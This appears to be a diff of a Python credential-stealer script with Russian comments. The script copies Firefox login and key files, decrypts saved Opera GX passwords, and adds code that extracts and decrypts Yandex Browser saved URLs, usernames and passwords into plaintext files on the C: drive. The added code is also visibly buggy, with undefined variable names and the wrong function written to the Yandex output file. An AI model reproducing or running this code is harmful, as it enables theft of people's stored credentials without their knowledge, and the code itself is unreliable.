@@ -11,9 +11,6 @@ import requests
 import sys
 
 
-
-username = os.getlogin() #узнаем имя пользователя на ПК
-
 def get_master_key_operaGX():
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State', "r", encoding='utf-8') as f:
         local_state = f.read()
@@ -88,7 +85,6 @@ def Firefox():
    for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
        for name in dirs:
             try:
-                #with open(os.path.join(root, name)+'\\logins.json', 'r', encoding='utf-8') as data_json:
                 shutil.copy2(os.path.join(root, name)+'\\logins.json', "logins.json")
                 shutil.copy2(os.path.join(root, name)+'\\key4.db', "key4.db")
             except Exception as e:
@@ -126,5 +122,50 @@ def OperaGX():
         pass      
 
 file = open('C:' + '\\operaGX_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
+file.write(str(OperaGX()) + '\n')
+file.close()
+
+def master_key_yandex():
+    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data'
+    shutil.copy2(login_data, "KeyYandex.db") 
+    conn = sqlite3.connect("KeyYandex.db")
+    cursor = conn.cursor()
+    try:
+        master_key = base64.b64decode(cursor.execute("SELECT local_encryptor_data FROM meta"))
+        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    except Exception as e:
+        print(e)
+        return None
+
+def yandex():
+    textY = ""
+    mster_key = master_key_yandex()
+    login_data = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data'
+    shutil.copy2(login_data, "LoginvaultYandex.db") 
+    conn = sqlite3.connect("LoginvaultYandex.db")
+    cursor = conn.cursor()
+    try:
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(encrypted_password, master_key)
+            print(str(encrypted_password))
+            texto += "URL: " + str(url) + "\nUser Name: " + str(username) + "\nPassword: " + str(decrypted_password) + "\n"
+        return texto
+    except Exception as e:
+        print(e)
+
+    cursor.close()
+    conn.close()
+
+    try:
+        os.remove("LoginvaultYandex.db")
+    except Exception as e:
+        pass      
+
+file = open('C:' + '\\Yandex_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
 file.write(str(OperaGX()) + '\n')
 file.close()
